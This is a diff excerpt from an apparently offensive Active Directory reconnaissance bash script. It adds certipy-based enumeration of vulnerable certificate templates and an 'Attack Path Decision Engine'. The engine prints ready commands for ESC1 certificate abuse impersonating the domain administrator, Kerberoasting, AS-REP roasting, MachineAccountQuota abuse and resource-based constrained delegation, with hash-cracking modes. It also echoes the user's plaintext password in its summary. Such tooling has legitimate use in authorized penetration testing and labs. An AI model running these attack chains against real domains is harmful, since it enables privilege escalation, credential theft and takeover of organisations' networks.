+        CERTIPY_OUTPUT=$(certipy-ad find \
+            -u "${AUTH_USER}@${AUTH_DOMAIN:-$LDAP_DOMAIN}" \
+            -p "$AUTH_PASS" \
+            -dc-ip "$TARGET" \
+            -vulnerable 2>&1)
+        CERTIPY_EXIT=$?
+
+        # Always display tool output
+        echo "$CERTIPY_OUTPUT"
+        echo
+
+        # -------- Credential failure detection --------
+        if echo "$CERTIPY_OUTPUT" | grep -qiE 'invalidCredentials|data 52e|authentication failed'; then
+            error "Invalid domain credentials supplied"
+            lightbulb "Verify username/password"
+            lightbulb "Confirm domain format: user@domain"
+            lightbulb "Try manual bind: ldapwhoami -x -D ${AUTH_USER}@${AUTH_DOMAIN:-$LDAP_DOMAIN} -W -H ldap://$TARGET"
+            ADCS_SERVICE_DETECTED=true
+        fi
+        # -------- Clock Skew Detection --------
+        if echo "$CERTIPY_OUTPUT" | grep -qi "KRB_AP_ERR_SKEW"; then
+            error "Kerberos clock skew detected during AD CS enumeration"
+
+            lightbulb "Kerberos requires time sync (±5 minutes)"
+            lightbulb "Fix on Kali:"
+            echo "    sudo ntpdate -u $TARGET"
+            echo "       OR"
+            echo "    sudo timedatectl set-ntp true"
+
+            info "Certipy may still enumerate templates, but Kerberos-based abuse may fail"
+       fi
+
+
+        if [[ $CERTIPY_EXIT -ne 0 ]]; then
+            warn "Certipy execution failed"
+            info "Continuing — AD CS detection is optional"
+        else
+            ADCS_SERVICE_DETECTED=true
+            
+            # Detect Certipy output file
+            CERTIPY_FILE=$(echo "$CERTIPY_OUTPUT" | grep -oE '[0-9]{14}_Certipy.txt' | head -n1)
+
+            if [[ -z "$CERTIPY_FILE" || ! -f "$CERTIPY_FILE" ]]; then
+                warn "Certipy Did Not Generate an Output File"
+            fi
+
+            info "Certipy Results Saved to: ${BYELLOW}$CERTIPY_FILE${RESET}"
+
+            # -------- Vulnerability detection --------
+            if grep -qiE 'ESC[0-9]+' "$CERTIPY_FILE"; then
+                ADCS_VULNERABLE=true
+                alert "VULNERABLE Active Directory Certificate Services detected"
+                
+                # Extract CA Names from Certipy output
+                mapfile -t ADCS_CA_NAMES < <(
+                    grep -iE '^\s*CA Name\s*:' "$CERTIPY_FILE" \
+                    | awk -F ':' '{gsub(/^[ \t]+/, "", $2); print $2}' \
+                    | sort -u
+                )
+                
+                if [[ ${#ADCS_CA_NAMES[@]} -gt 0 ]]; then
+                    success "Certificate Authority detected:"
+                    for ca in "${ADCS_CA_NAMES[@]}"; do
+                        echo -e "    ${CYAN}- $ca${RESET}"
+                        target_ca="$ca"
+                    done
+
+                    # Optional: export for synopsis or later abuse
+                    ADCS_CA_PRESENT=true
+                else
+                    warn "No Certificate Authority name found in Certipy output"
+                fi
+
+                # -------- Extract ESC identifiers --------
+                mapfile -t ADCS_ESC < <(
+                    grep -oEi 'ESC[0-9]+' "$CERTIPY_FILE" \
+                    | sort -u
+                )
+
+                if [[ ${#ADCS_ESC[@]} -gt 0 ]]; then
+                    success "Exploitation paths identified:"
+                    for esc in "${ADCS_ESC[@]}"; do
+                        case "$esc" in
+                            ESC1|ESC4)
+                                 echo -e "    ${RED}${esc}${RESET}  →  ${RED}CRITICAL${RESET}  (10/10)"
+                                 echo -e "        ${YELLOW}Instant privilege escalation via certificate enrollment${RESET}"
+                                 echo -e "        Exploit Command: "
+                                 echo -e "          ${GREEN}certipy req -u '${AUTH_USER}@${AUTH_DOMAIN:-$LDAP_DOMAIN}' -p '$AUTH_PASS' -template <TEMPLATE> -dc-ip '${TARGET}' -target '[CA].${AUTH_DOMAIN:-$LDAP_DOMAIN}' -ca '${target_ca}' -upn 'administrator@${AUTH_DOMAIN:-$LDAP_DOMAIN}' -sid '[admin_sid]' -dns ${AUTH_DOMAIN:-$LDAP_DOMAIN} -debug${RESET}"
+                                 ;;
+                            ESC2|ESC3)
+                                 echo -e "    ${YELLOW}${esc}${RESET} →  ${YELLOW}HIGH${RESET}      (8/10)"
+                                 echo -e "        Certificate abuse with weak approval / client auth"
+                                 ;;
+                            ESC6|ESC8)
+                                 echo -e "    ${YELLOW}${esc}${RESET} →  ${YELLOW}HIGH${RESET}      (8/10)"
+                                 echo -e "        NTLM relay / authentication coercion attack"
+                                 ;;
+                            ESC5|ESC7)
+                                 echo -e "    ${BLUE}${esc}${RESET}   →  ${BLUE}MEDIUM${RESET}    (6/10)"
+                                 echo -e "        Requires additional permissions or attack chaining"
+                                 ;;
+                            *)
+                                 echo -e "    ${esc}   →  UNKNOWN risk"
+                                 ;;
+                       esac
+                    done
+                else
+                    warn "Vulnerability detected but ESC identifier could not be parsed"
+                fi
+    
+                mapfile -t ADCS_TEMPLATES < <(
+                    grep -iE 'Template Name|Template:' "$CERTIPY_FILE" \
+                    | sed -E 's/.*(Template Name|Template):\s*//I' \
+                    | sort -u
+                )
+		
+                if [[ ${#ADCS_TEMPLATES[@]} -gt 0 ]]; then
+                    success "Vulnerable certificate templates identified:"
+                    for tpl in "${ADCS_TEMPLATES[@]}"; do
+                        echo -e "    ${RED}- $tpl${RESET}"
+                    done
+                else
+                    warn "Vulnerable templates detected but names could not be parsed"
+                fi
+
+                lightbulb "Next steps (manual exploitation):"
+                echo -e "    certipy-ad req -u '${AUTH_USER}@${AUTH_DOMAIN:-$LDAP_DOMAIN}' -p '$AUTH_PASS' -template <TEMPLATE> -dc-ip $TARGET"
+                echo -e "    certipy-ad auth -pfx user.pfx"
+
+            else
+                success "No vulnerable certificate templates detected"
+            fi
+        fi
+    else
+    	warn "AD CS check skipped — certipy-ad not installed"
+        tip "Install with: pipx install certipy-ad"
+    fi
+elif [[ "$HAS_LDAP" -eq 1 && "$HAS_KERB" -eq 1 && "$ENABLE_ADCS" == false ]]; then
+    echo
+    alert "${BLUE}Tip:${RESET} AD Certificate Services Detected"
+    echo "  --------------------------------------"
+    echo -e "    Re-run with ${BLUE}--check-certs${RESET} to review Certificate Templates (Check for Vulnerable Templates)"
+    echo "    Example:"
+    echo "      ./bash_simpleportscan.sh $TARGET --check-certs --user='username' --pass='password'"
+elif [[ "$HAS_LDAP" -eq 1 && "$HAS_KERB" -eq 1 && "$CREDS_PROVIDED" == false ]]; then
+    warn "AD CS check skipped — Credentials are required."
+elif [[ "$ENABLE_ADCS" == true && "$HAS_LDAP" -eq 0 ]]; then
+    warn "AD CS check skipped — LDAP port not accessible"
+    echo -e "   - Required ports: 389 (LDAP) or 636 (LDAPS) and 88 (Kerberos)"
+fi
+
+
+########################################
 # Perform Attack: Kerberoast
 ########################################
 if [[ "$ENABLE_KERBROAST" == true && "$CREDS_PROVIDED" == true && "$HAS_KERB" -eq 1 ]]; then
@@ -1730,8 +1978,8 @@ if [[ "$ENABLE_KERBROAST" == true && "$CREDS_PROVIDED" == true && "$HAS_KERB" -e
 
     if [[ ! -s "$KERBEROAST_FILE" ]]; then
         warn "Kerberoast skipped — no SPNs detected during LDAP enumeration"
-        tip "Ensure users have servicePrincipalName attributes"
-        tip "Check manually: ldapsearch '(servicePrincipalName=*)'"
+        lightbulb "Ensure users have servicePrincipalName attributes"
+        lightbulb "Check manually: ldapsearch '(servicePrincipalName=*)'"
         return 0
     fi
 
@@ -2034,6 +2282,14 @@ generate_synopsis() {
     echo -e "\n${BLUE}========================================${RESET}"
     echo -e "${BYELLOW}          RECON SYNOPSIS               ${RESET}"
     echo -e "${BLUE}========================================${RESET}"
+    echo
+    if [ -n "$AUTH_USER" ] && [ -n "$AUTH_PASS" ]; then
+        echo -e "   - User:      ${YELLOW}$AUTH_USER${RESET}"
+        echo -e "   - Password:  ${YELLOW}$AUTH_PASS${RESET}"
+    fi
+    if [ -n "$AUTH_DOMAIN" ] ; then
+        echo -e "   - Domain:    ${YELLOW}$AUTH_DOMAIN${RESET}"
+    fi
     
     local found_any=false
 
@@ -2048,7 +2304,7 @@ generate_synopsis() {
     }
 
     # 1. Active Directory / Kerberos
-    if [ "$LDAP_ANON_BIND" = true ] || [ "$LDAP_GUEST_BIND" = true ] || [ "$LDAP_AUTH_BIND" = true ] || [ "$ASREP_OK" = true ] || [ "$KERBEROS_AUTH_OK" = true ]; then
+    if [ "$LDAP_ANON_BIND" = true ] || [ "$LDAP_GUEST_BIND" = true ] || [ "$LDAP_AUTH_BIND" = true ] || [ "$ASREP_OK" = true ] || [ "$KERBEROS_AUTH_OK" = true ] || [ "$CAN_JOIN_COMPUTERS_TO_DOMAIN" = true ]; then
         echo -e "\n ${CYAN}ACTIVE DIRECTORY (AD) SERVICES${RESET}"
         echo -e " --------------------------------------"
         print_item "$KERBEROS_AUTH_OK" "Valid Kerberos Credentials ($AUTH_USER)"
@@ -2057,13 +2313,21 @@ generate_synopsis() {
         print_item "$LDAP_AUTH_BIND" "Authenticated LDAP access confirmed"
         print_item "$ASREP_OK" "AS-REP Roasting is possible (User hashes obtainable)"
         print_item "$LAPS_READABLE" "LAPS Passwords are READABLE (High Risk / Local Admin)"
+        print_item "$CAN_JOIN_COMPUTERS_TO_DOMAIN" "MachineAccountQuota Allows users to create up to ${MACHINE_ACCOUNT_QUOTA} computer accounts"
     fi
-
+    
+    if [[ "$ADCS_VULNERABLE" == true ]]; then
+        echo -e "\n ${CYAN}CERTIFICATE SERVICES (ADCS)${RESET}"
+        echo -e " --------------------------------------"
+        print_item "$ADCS_SERVICE_DETECTED" "AD CS Services Detected"
+        print_item "$ADCS_VULNERABLE" "VULNERABLE ${#ADCS_TEMPLATES[@]} template(s)"
+    fi
+    
     # 2. Remote Management
     if [ "$WINRM_DETECTED" = true ] || [ "$SSH_DETECTED" = true ]; then
         echo -e "\n ${CYAN}REMOTE MANAGEMENT SERVICES${RESET}"
         echo -e " --------------------------------------"
-        print_item "$WINRM_DETECTED" "WinRM Service is Open (Possible Lateral Movement)"
+        print_item "$WINRM_DETECTED" "WinRM Service is Open and Access is Allowed (Possible Lateral Movement)"
         #print_item "$SSH_DETECTED" "SSH Service is Open (Check for password/key reuse)"
     fi
 
@@ -2104,6 +2368,87 @@ generate_synopsis() {
 }
 # Generate the final summary
 generate_synopsis
+
+########################################
+# Attack Path Decision Engine
+########################################
+attack_path_evaluation() {
+    echo -e "\n${BLUE}========================================${RESET}"
+    echo -e "${BYELLOW}    Attack Path Decision Engine        ${RESET}"
+    echo -e "${BLUE}========================================${RESET}"
+    #info "Evaluating LDAP-based attack paths"
+
+    # 1. Kerberoasting (always valid if SPNs found)
+    if [[ -v KERBEROAST_TARGETS && ${#KERBEROAST_TARGETS[@]} -gt 0 ]]; then
+        ATTACK_PATHS+=("Kerberoasting")
+        critical "Attack Path: Kerberoasting viable"
+        tip "Next Steps (Kerberoasting):"
+        echo "   - Request service tickets (netexec ldap ldap $TARGET -u username -p 'password' --kerberoasting output.txt / GetUserSPNs.py)"
+        echo "   - Crack hashes offline (hashcat mode 13100 / 19600)"
+        echo "   - Re-test SMB / LDAP / WinRM with cracked credentials"
+        echo "   - Check cracked account group membership (Domain Admins, Operators)"
+        echo
+    fi
+
+    # 2. MAQ-based computer abuse
+    if [[ "$LDAP_BIND_TYPE" == "auth" && "$MAQ_ENABLED" == true ]]; then
+        ATTACK_PATHS+=("MachineAccountQuota Abuse")
+        critical "Attack Path: MAQ abuse possible (computer account creation)"
+        lightbulb "Next Step:"
+        echo "   - Create a computer account (addcomputer.py / netexec)"
+        echo "   - Set SPN on the new computer"
+        echo "   - Kerberoast the computer account"
+        echo "   - Check RBCD paths (BloodHound)"
+        echo
+    fi
+    
+    if [[ "$ADCS_VULNERABLE" = true ]]; then
+        ATTACK_PATHS+=("Exploitable Certificate Templates Detected (ADCS Abuse)")
+        critical "Attack Path: ADCS Abuse"
+        lightbulb "Next Steps:"
+        echo "   - Enumerate vulnerable templates (certipy find ... -vulnerable -stdout / netexec ldap ... -M adcs -o action=list)"
+        echo "   - Request authentication certificate as target user"
+        echo "   - Authenticate using certificate (PKINIT / certipy auth)"
+        echo "   - Dump NTLM hash or obtain TGT"
+        echo "   - Re-test privileged access (SMB / LDAP / WinRM)"
+        echo
+    fi
+    
+    if [[ "$ASREP_OK" = true ]]; then
+        ATTACK_PATHS+=("AS-REP Roasting (User hashes obtainable)")
+        critical "Attack Path: AS-REP Roasting Possible (User hashes obtainable)"
+        lightbulb "Next Steps:"
+        echo "   - Request AS-REP hashes (GetNPUsers.py / netexec / crackmapexec ldap $TARGET -u username -p 'password' --asreproast output.txt)"
+        echo "   - Crack hashes offline (hashcat mode 18200)"
+        echo "   - Re-test LDAP/SMB/WinRM with cracked creds"
+        echo
+    fi
+    
+    # 3. RBCD candidate (needs MAQ + writable ACLs later)
+    if [[ "$MAQ_ENABLED" == true && "$HAS_WRITABLE_COMPUTER_ACL" == true ]]; then
+        ATTACK_PATHS+=("RBCD via MAQ")
+        critical "Attack Path: Resource-Based Constrained Delegation candidate"
+        lightbulb "Next Steps:"
+        echo "   - Create a new computer account (MAQ abuse)"
+        echo "       * netexec ldap $TARGET -u <user> -p <pass> --add-computer <name>$ <pass>"
+        echo "   - Identify writable target computer object"
+        echo "   - Set msDS-AllowedToActOnBehalfOfOtherIdentity"
+        echo "       * rbcd.py <domain>/<user>:<pass> -t <target_computer> -f <new_computer>$"
+        echo "   - Request service ticket as privileged user (S4U2Proxy)"
+        echo "       * getST.py -spn cifs/<target> <domain>/<new_computer>$:<pass>"
+        echo "   - Authenticate as impersonated user (SMB / WinRM / LDAP)"
+        echo
+    fi
+
+    # 4. No viable paths
+    if [[ ${#ATTACK_PATHS[@]} -eq 0 ]]; then
+        warn "No immediate attack paths identified"
+    fi
+}
+
+# Generate Attack Path Summary
+attack_path_evaluation
+
 
 # --------- Recon Summary & Next Steps ----------
 echo
